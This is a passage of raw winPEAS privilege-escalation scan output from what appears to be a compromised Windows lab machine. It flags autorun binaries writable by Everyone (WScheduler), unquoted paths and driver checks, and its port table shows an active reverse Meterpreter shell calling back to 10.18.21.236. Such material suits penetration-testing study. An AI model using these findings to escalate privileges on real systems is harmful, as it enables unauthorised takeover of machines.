È Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                                                                  
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
    Key: WScheduler
    Folder: C:\Program Files (x86)\SystemScheduler
    FolderPerms: Everyone [WriteData/CreateFiles]
    File: C:\PROGRA~2\SYSTEM~1\WScheduler.exe /LOGON
    FilePerms: Everyone [WriteData/CreateFiles]
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================
    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================
    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================
    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DllDirectory
    Folder: C:\Windows\system32
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DllDirectory32
    Folder: C:\Windows\syswow64
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64cpu
    Folder: None (PATH Injection)
    File: Wow64cpu.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64win
    Folder: None (PATH Injection)
    File: Wow64win.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: LPK
    Folder: None (PATH Injection)
    File: LPK.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64
    Folder: None (PATH Injection)
    File: Wow64.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================
    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Users [AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}
    Key: StubPath
    Folder: C:\Program Files\Windows Mail
    File: C:\Program Files\Windows Mail\WinMail.exe OCInstallUserConfigOE (Unquoted and Space detected)
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin
   =================================================================================================
    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}
    Key: StubPath
    Folder: C:\Program Files\Windows Mail
    File: C:\Program Files\Windows Mail\WinMail.exe OCInstallUserConfigOE (Unquoted and Space detected)
   =================================================================================================
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
   =================================================================================================
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Ec2WallpaperInfo.url (Unquoted and Space detected)
   =================================================================================================
    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================
    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================
    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================
    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================
ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                        
ÉÍÍÍÍÍÍÍÍÍÍ¹ Device Drivers --Non Microsoft--
È Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#vulnerable-drivers                                                                                           
    XENBUS - 8.2.6.54 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenbus.sys
    XEN - 8.2.6.54 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xen.sys
    XENFILT - 8.2.6.54 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenfilt.sys
    VIA PCI IDE MINI Driver - 6,0,6000,170 [VIA Technologies, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\viaide.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.22 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    Broadcom NetXtreme II GigE - 7.4.14.0 [Broadcom Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    Broadcom NetXtreme II 10 GigE - 7.4.33.1 [Broadcom Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys                                                                                                                            
    Adaptec RAID Controller - 7.2.0.30261 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.22 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.82 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys                                                                                                                             
    LSI SAS Gen2 Driver (StorPort) - 2.00.60.82 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2.sys
    LSI SAS Gen3 Driver (StorPort) - 2.50.65.01 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys                                                                                                                             
    Marvell Flash Controller -  1.0.5.1015  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys                                                                                                                            
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys                                                                                                                             
    MEGASAS RAID Controller Driver for Windows - 6.600.21.08 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys                                                                                                                      
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Intel Rapid Storage Technology driver (inbox) - 12.0.1.1018 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAV.sys                                                                                                                
    AHCI 1.3 Device Driver - 1.1.4.14 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.4.14 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys                                                                                                                  
    VIA RAID driver - 7.0.9200,6320 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys                                                                                                              
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys                                                                                                                 
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys                                                                                                                        
    QLogic Fibre Channel Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys                                                                                                                 
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys                                                                                                                          
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys                                                                                                                    
    Emulex WS2K12 Storport Miniport Driver x64 - 2.74.214.004 05/23/2013 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys                                                                                                 
    Emulex WS2K12 Storport Miniport Driver x64 - 2.74.214.004 05/23/2013 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys                                                                                                 
    Brocade FC/FCoE HBA Stor Miniport Driver - 3.2.2.5 [Brocade Communications Systems, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys                                                                                                         
    Brocade FC/FCoE HBA Stor Miniport Driver - 3.2.2.5 [Brocade Communications Systems, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys                                                                                                     
    XENVBD - 8.2.6.29 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenvbd.sys
    XENCRSH - 8.2.6.29 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xencrsh.sys
    Amazon NVMe Storage Driver - V1.3.0 [Amazon]: \\.\GLOBALROOT\SystemRoot\System32\drivers\AWSNVMe.sys
    PMC-Sierra HBA Controller - 1.0.0.0254 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys                                                                                   
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mlx4_bus.sys
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ibbus.sys
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ndfltr.sys
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\winverbs.sys
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\winmad.sys
    Broadcom iSCSI offload driver - 7.4.4.0 [Broadcom Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys
    Broadcom FCoE offload driver - 7.4.6.0 [Broadcom Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys
    XENVIF - 8.2.5.22 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenvif.sys
    XENIFACE - 8.2.5.39 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xeniface.sys
    XENNET - 8.2.5.32 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\xennet.sys
    Macrovision SECURITY Driver - SECURITY Driver 4.03.086 2006/09/13 [Macrovision Corporation, Macrovision Europe Limited, and Macrovision Japan and Asia K.K.]: \\.\GLOBALROOT\SystemRoot\System32\Drivers\secdrv.SYS
ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Shares
    ADMIN$ (Path: )
    C$ (Path: )
    IPC$ (Path: )
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate Network Mapped Drives (WMI)
ÉÍÍÍÍÍÍÍÍÍÍ¹ Host File
ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Ifaces and known hosts
È The masks are only for the IPv4 addresses 
  [X] Exception: The requested protocol has not been configured into the system, or no implementation for it exists
    Ethernet 2[02:C0:40:AA:DA:F9]: 10.10.33.96, fe80::9809:63e1:bcf3:12ad%14 / 255.255.0.0
        Gateways: 10.10.0.1
        DNSs: 10.0.0.2
    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                              
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         784             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         2040            svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49152         0.0.0.0               0               Listening         588             wininit
  TCP        0.0.0.0               49153         0.0.0.0               0               Listening         864             svchost
  TCP        0.0.0.0               49154         0.0.0.0               0               Listening         904             svchost
  TCP        0.0.0.0               49155         0.0.0.0               0               Listening         1128            spoolsv
  TCP        0.0.0.0               49161         0.0.0.0               0               Listening         680             lsass
  TCP        0.0.0.0               49175         0.0.0.0               0               Listening         672             services
  TCP        10.10.33.96           80            10.18.21.236          37608           Close Wait        4               System
  TCP        10.10.33.96           139           0.0.0.0               0               Listening         4               System
  TCP        10.10.33.96           49381         10.18.21.236          443             Established       812             c:\windows\system32\inetsrv\w3wp.exe
  TCP        10.10.33.96           49421         10.18.21.236          444             Established       3064            C:\windows\temp\revsh-meterpr-444.exe
  TCP        10.10.33.96           49429         169.254.169.254       80              Close Wait        1636            Ec2Config

  Enumerating IPv6 connections
                                                                                                                              
  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name
  TCP        [::]                                        80            [::]                                        0               Listening         4               System
  TCP        [::]                                        135           [::]                                        0               Listening         784             svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        3389          [::]                                        0               Listening         2040            svchost
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49152         [::]                                        0               Listening         588             wininit
  TCP        [::]                                        49153         [::]                                        0               Listening         864             svchost
  TCP        [::]                                        49154         [::]                                        0               Listening         904             svchost
  TCP        [::]                                        49155         [::]                                        0               Listening         1128            spoolsv
  TCP        [::]                                        49161         [::]                                        0               Listening         680             lsass
  TCP        [::]                                        49175         [::]                                        0               Listening         672             services
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current UDP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                              
  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name
  UDP        0.0.0.0               123           *:*                            960               svchost
  UDP        0.0.0.0               3389          *:*                            2040              svchost
  UDP        0.0.0.0               5355          *:*                            1020              svchost
  UDP        10.10.33.96           137           *:*                            4                 System
  UDP        10.10.33.96           138           *:*                            4                 System
  UDP        127.0.0.1             49896         *:*                            2460              C:\windows\temp\winpeas.exe

  Enumerating IPv6 connections
                                                                                                                              
  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name
  UDP        [::]                                        123           *:*                            960               svchost
  UDP        [::]                                        3389          *:*                            2040              svchost
  UDP        [::]                                        5355          *:*                            1020              svchost
ÉÍÍÍÍÍÍÍÍÍÍ¹ Firewall Rules
È Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
